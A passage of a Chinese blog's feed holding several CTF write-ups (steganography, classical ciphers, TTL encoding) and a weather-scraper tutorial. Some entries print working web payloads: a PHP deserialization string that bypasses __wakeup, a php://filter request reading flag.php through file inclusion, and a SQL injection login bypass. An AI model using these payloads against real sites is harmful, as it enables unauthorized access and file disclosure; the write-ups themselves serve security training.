    <link href="https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4.html</id>
    <published>2020-02-07T08:51:35.000Z</published>
    <updated>2020-02-07T09:22:49.870Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p><strong>下载压缩包解压有密码，binwalk分离出来两个压缩包。</strong></p><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/1.png" class title="This is an test image"><p><strong>会直接把fo.txt分离出来。</strong></p><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/2.png" class title="This is an test image"><p><strong>打开是’与佛论禅’密码，在线网站解密一下。</strong></p><img src="/2-7-GXYCTF2019-%E4%BD%9B%E7%B3%BB%E9%9D%92%E5%B9%B4/3.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;p&gt;&lt;strong&gt;下载压缩包解压有密码，binwalk分离出来两个压缩包。&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-7-GXYCTF2019
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 buuctf_misc_从娃娃抓起</title>
    <link href="https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html"/>
    <id>https://da4er.top/2-6-buuctf-misc-%E4%BB%8E%E5%A8%83%E5%A8%83%E6%8A%93%E8%B5%B7.html</id>
    <published>2020-02-06T04:37:40.000Z</published>
    <updated>2020-02-07T07:51:57.592Z</updated>
    
    <content type="html"><![CDATA[<p><strong>根据题目提示：</strong><br><img src="/2.png" alt="2-6-buuctf-misc-从娃娃抓起"><br>编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。<br><img src="/3.png" alt="2-6-buuctf-misc-从娃娃抓起"><br><a href="https://dianma.51240.com/" target="_blank" rel="noopener">中文电码在线解码</a><br><strong>五笔编码现在还没有找到好的网站去解，只能一个一个对照emmmmmm</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;根据题目提示：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2.png&quot; alt=&quot;2-6-buuctf-misc-从娃娃抓起&quot;&gt;&lt;br&gt;编码是两个汉字编码，试了好多编码形式，找到了两个：中文电码和五笔编码。&lt;br&gt;&lt;img src=&quot;/3.png&quot; al
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 [SWPU2019]Network</title>
    <link href="https://da4er.top/2-6-SWPU2019-Network.html"/>
    <id>https://da4er.top/2-6-SWPU2019-Network.html</id>
    <published>2020-02-06T03:52:51.000Z</published>
    <updated>2020-02-07T12:10:11.126Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。</strong></p><hr><p><strong>将每个数字转化成8位二进制</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">63 00111111 </span><br><span class="line">127 01111111 </span><br><span class="line">191 10111111 </span><br><span class="line">255 11111111</span><br></pre></td></tr></table></figure><p>每一个 TTL 只有前两位隐藏数据，每四个为一组，隐藏一个字节。<br>附上脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#39;attachment.txt&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    a&#x3D;fp.readlines()</span><br><span class="line">    p&#x3D;[]</span><br><span class="line">    for x in range(len(a)):</span><br><span class="line">       p.append(int(a[x])) </span><br><span class="line">    s&#x3D;&#39;&#39;</span><br><span class="line">    for i in p:</span><br><span class="line">        if(i&#x3D;&#x3D;63):</span><br><span class="line">            b&#x3D;&#39;00&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;127):</span><br><span class="line">            b&#x3D;&#39;01&#39;</span><br><span class="line">        elif(i&#x3D;&#x3D;191):</span><br><span class="line">            b&#x3D;&#39;10&#39;</span><br><span class="line">        else:</span><br><span class="line">            b&#x3D;&#39;11&#39;</span><br><span class="line">        s +&#x3D;b</span><br><span class="line"># print(s)</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,len(s),8):</span><br><span class="line">    flag +&#x3D; chr(int(s[i:i+8],2))</span><br><span class="line">flag &#x3D; binascii.unhexlify(flag)</span><br><span class="line">wp &#x3D; open(&#39;ans.zip&#39;,&#39;wb&#39;)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure><p><strong>转换成一个压缩包，有密码是伪加密，修改完得到flag。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;题目是一个txt文件，里面只有4个数字：63，127，191，255。虽然题目提示network，但是看了wp知道是ttl隐写。&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;将每个数字转化成8位二进制&lt;/strong&gt;&lt;/p&gt;
&lt;figure 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.6 [极客大挑战 2019]PHP</title>
    <link href="https://da4er.top/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html"/>
    <id>https://da4er.top/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP.html</id>
    <published>2020-02-06T03:06:11.000Z</published>
    <updated>2020-02-07T12:10:21.236Z</updated>
    
    <content type="html"><![CDATA[<p><strong>根据题目提示：题目有源码备份，下载得到<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a></strong></p><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/3.png" class title="This is an test image"><p><strong>有三个php文件</strong><br>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &#39;Syc&#123;dog_dog_dog_dog&#125;&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过分析知：$select进行反序列化。<br>关键在class.php中的_destruct()魔法函数。<br>对于序列化问题有调用魔法函数顺序的问题：</p><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/4.png" class title="This is an test image"><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/5.png" class title="This is an test image"><p>对于题目需要将username=admin，password=100，但是会先执行_wakeup函数将username=guest，所以这道题目关键在于如何绕过_wakeup函数。<br><strong>知识点：如何绕过_wakeup</strong></p><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/6.png" class title="This is an test image"><p>测试php：</p><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1.png" class title="This is an test image"><p>形成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>这个payload绕过__wakeup()函数，使username不被覆盖，加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失。<br>得到flag</p><img src="/2-6-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/2.png" class title="This is an test image"><p>参考博客：<br><a href="https://www.jianshu.com/p/bfe00fd583df" target="_blank" rel="noopener">https://www.jianshu.com/p/bfe00fd583df</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;根据题目提示：题目有源码备份，下载得到&lt;a href=&quot;http://www.zip。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip。&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-6-%E6%9E%81%E5
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2-6 [SWPU2019]你有没有好好看网课?</title>
    <link href="https://da4er.top/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html"/>
    <id>https://da4er.top/2-6-SWPU2019-%E4%BD%A0%E6%9C%89%E6%B2%A1%E6%9C%89%E5%A5%BD%E5%A5%BD%E7%9C%8B%E7%BD%91%E8%AF%BE.html</id>
    <published>2020-02-05T16:04:21.000Z</published>
    <updated>2020-02-07T07:52:03.208Z</updated>
    
    <content type="html"><![CDATA[<p><strong>flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。</strong><br><img src="/1.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><strong>查看flag.docx</strong><br><img src="/5.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>看了别的师傅的wp，这个docx提示查看mp4对应帧数:<strong>00:00:05:20；00:00:07:11</strong><br><img src="/2.png" alt="2-6-SWPU2019-你有没有好好看网课"><br><img src="/3.png" alt="2-6-SWPU2019-你有没有好好看网课"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">..... ..&#x2F;... .&#x2F;... .&#x2F;... ..&#x2F;dXBfdXBfdXA&#x3D;</span><br></pre></td></tr></table></figure><p>后面一段是base64编码，前面的一段一开始以为是摩斯编码，但是看了wp知道了是敲击码。<br><img src="/4.png" alt="2-6-SWPU2019-你有没有好好看网课"><br>解的flag2.zip密码：<strong>wllmup_up_up</strong><br><strong>flag2.zip下是一张图片，将这张图片用winhex打开，在最下面得到flag。</strong><br><img src="/6.png" alt="2-6-SWPU2019-你有没有好好看网课"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;flag2.php，flag3.php都有密码：flag3.php提示密码是六位数，爆破得到密码。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/1.png&quot; alt=&quot;2-6-SWPU2019-你有没有好好看网课&quot;&gt;&lt;br&gt;&lt;strong&gt;查看flag.d
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [极客大挑战 2019]Havefun&amp;Secret File</title>
    <link href="https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File.html"/>
    <id>https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File.html</id>
    <published>2020-02-05T14:43:55.000Z</published>
    <updated>2020-02-07T12:10:01.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h2><p><strong>查看源代码</strong></p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/1.png" class title="This is an test image"><p><strong>直接传参cat=dog,得到flag.</strong></p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/2.png" class title="This is an test image"><h2 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h2><p><strong>通过查看源代码知道这个题目有三个文件:Archive_room.php action.php end.php</strong><br>在这里通过访问：Archive_room.php会直接跳转到end.php，没有经过action.php。<br><strong>访问action.php抓包查看，得到第四个文件secr3t.php 。</strong></p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/3.png" class title="This is an test image"><p>访问secr3t.php 得到源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); &#x2F;&#x2F;flag放在了flag.php里?&gt;</span><br></pre></td></tr></table></figure><p><strong>通过分析这段代码没有过滤php伪协议：我们可以使用file来读取flag。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>得到flag：</p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun-Secret-File/4.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Havefun&quot;&gt;&lt;a href=&quot;#Havefun&quot; class=&quot;headerlink&quot; title=&quot;Havefun&quot;&gt;&lt;/a&gt;Havefun&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;查看源代码&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-5-%E6%9E%8
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [极客大挑战 2019]EasySQL</title>
    <link href="https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL.html"/>
    <id>https://da4er.top/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL.html</id>
    <published>2020-02-05T14:23:34.000Z</published>
    <updated>2020-02-07T12:09:51.364Z</updated>
    
    <content type="html"><![CDATA[<p><strong>对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。</strong></p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/1.png" class title="This is an test image"><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/2.png" class title="This is an test image"><hr><p><strong>尝试一下万能密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#x3D;1</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/3.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;对题目进行简单的分析：单引号闭合；开启了错误提示。想到报错注入，但是报错注入没检测无法利用。&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-5-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Eas
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.5 [SWPU2019]伟大的侦探</title>
    <link href="https://da4er.top/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2.html"/>
    <id>https://da4er.top/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2.html</id>
    <published>2020-02-05T11:20:21.000Z</published>
    <updated>2020-02-07T12:00:01.449Z</updated>
    
    <content type="html"><![CDATA[<p><strong>打开压缩包，文件有密码，密码在txt里</strong></p><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/1.png" class title="This is an test image"><p><strong>010Editor打开，转化成EBDIC编码得到密码</strong></p><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/2.png" class title="This is an test image"><p><strong>打开文件发现是一堆小人，百度可知这是福尔摩斯小人编码</strong></p><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/3.png" class title="This is an test image"><p><strong>解码得到flag:iloveholmesandwllm</strong></p><img src="/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/4.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;打开压缩包，文件有密码，密码在txt里&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;/2-5-SWPU2019-%E4%BC%9F%E5%A4%A7%E7%9A%84%E4%BE%A6%E6%8E%A2/1.png&quot; class title=&quot;This i
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>实战_爬取中国天气网</title>
    <link href="https://da4er.top/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91.html"/>
    <id>https://da4er.top/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91.html</id>
    <published>2020-02-05T10:52:26.000Z</published>
    <updated>2020-02-07T12:12:10.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>将中国天气网所有城市的最低气温爬取下来，将最低气温的前十名可视化显示出来。<br><strong>这个爬虫比较简单没有做反爬处理，所以对于获取html代码比较简单，关键在于如何解析得到的html代码。</strong></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from pyecharts.charts.bar import Bar</span><br><span class="line">ALL_DATA&#x3D;[]</span><br><span class="line">def parse_page(url):</span><br><span class="line">    headers&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;71.0.3578.98 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;headers)</span><br><span class="line">    #print(resp.text)</span><br><span class="line">    text&#x3D;resp.content.decode(&quot;utf-8&quot;)</span><br><span class="line">    # print(text)</span><br><span class="line">    #这里使用的解析器是html5lib，因为在使用常用的lxml解析器容错率不好，港澳台天气这个页面html书写不规范，从而无法正常爬取。</span><br><span class="line">    #pip install html5lib</span><br><span class="line">    soup&#x3D;BeautifulSoup(text,&quot;html5lib&quot;)</span><br><span class="line">    divs&#x3D;soup.find(&quot;div&quot;,class_&#x3D;&quot;conMidtab&quot;) #获取第一个div标签</span><br><span class="line">    tables&#x3D;divs.find_all(&quot;table&quot;)</span><br><span class="line">    for table in tables:</span><br><span class="line">        trs&#x3D;table.find_all(&quot;tr&quot;)[2:]</span><br><span class="line">        for index,tr in enumerate(trs):</span><br><span class="line">            # print(tr)</span><br><span class="line">            # print(&quot;&#x3D;&quot;*30)</span><br><span class="line">            tds&#x3D;tr.find_all(&quot;td&quot;)</span><br><span class="line">            if(index&#x3D;&#x3D;0):</span><br><span class="line">                city_td&#x3D;tds[1]</span><br><span class="line">            else:</span><br><span class="line">                city_td&#x3D;tds[0]</span><br><span class="line">            city&#x3D;list(city_td.stripped_strings)[0]</span><br><span class="line">            # print(city)</span><br><span class="line">            temp_td&#x3D;tds[-2]</span><br><span class="line">            temp&#x3D;list(temp_td.stripped_strings)[0]</span><br><span class="line">            # print(&#123;&#39;city&#39;:city,&#39;temp&#39;:temp&#125;)</span><br><span class="line">            data&#x3D;&#123;&#39;city&#39;:city,&#39;temp&#39;:int(temp)&#125;</span><br><span class="line">            ALL_DATA.append(data)</span><br><span class="line">def spider():</span><br><span class="line">    base_url&#x3D;&quot;http:&#x2F;&#x2F;www.weather.com.cn&#x2F;textFC&#x2F;&#123;&#125;.shtml&quot;</span><br><span class="line">    params&#x3D;[&quot;hb&quot;,&quot;db&quot;,&quot;hd&quot;,&quot;hz&quot;,&quot;hn&quot;,&quot;xb&quot;,&quot;xn&quot;,&quot;gat&quot;]</span><br><span class="line">    for param in params:</span><br><span class="line">        url&#x3D;base_url.format(param)</span><br><span class="line">        parse_page(url)</span><br><span class="line">    ALL_DATA.sort(key&#x3D;lambda x:x[&#39;temp&#39;])</span><br><span class="line">    # print(ALL_DATA)</span><br><span class="line">    data&#x3D;ALL_DATA[0:10]</span><br><span class="line">    cicties&#x3D;list(map(lambda x:x[&#39;city&#39;],data))</span><br><span class="line">    temps&#x3D;list(map(lambda x:x[&#39;temp&#39;],data))</span><br><span class="line">    chart&#x3D;Bar(&quot;中国天气排行榜&quot;)</span><br><span class="line">    chart.add(&quot;&quot;,cicties,temps)</span><br><span class="line">    chart.render(&#39;temp.html&#39;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    spider()</span><br></pre></td></tr></table></figure><hr><h4 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h4><p>这里使用的是beautifulsoup库，用的解析器是html5lib；因为在爬取港澳台地区的天气时，这个页面的html代码写的不规范。如果我们使用常用的lxml解析器的话会无法正常爬取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install html5lib</span><br></pre></td></tr></table></figure><img src="/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91/1.png" class title="This is an test image"><p><strong>这里是这段代码比较重要的部分，通过sort函数对得到的数据进行排序，’key=’参数指定按什么关键字排序。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALL_DATA.sort(key&#x3D;lambda x:x[&#39;temp&#39;])</span><br></pre></td></tr></table></figure><p>这里是按照字典中的temp参数进行排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cicties&#x3D;list(map(lambda x:x[&#39;city&#39;],data))</span><br><span class="line">temps&#x3D;list(map(lambda x:x[&#39;temp&#39;],data))</span><br></pre></td></tr></table></figure><p>这段代码是通过lambda和map()将城市和对应的最低温度形成单个的列表</p><hr><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p><strong>效果如图：</strong></p><img src="/%E5%AE%9E%E6%88%98-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A9%E6%B0%94%E7%BD%91/2.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      
      
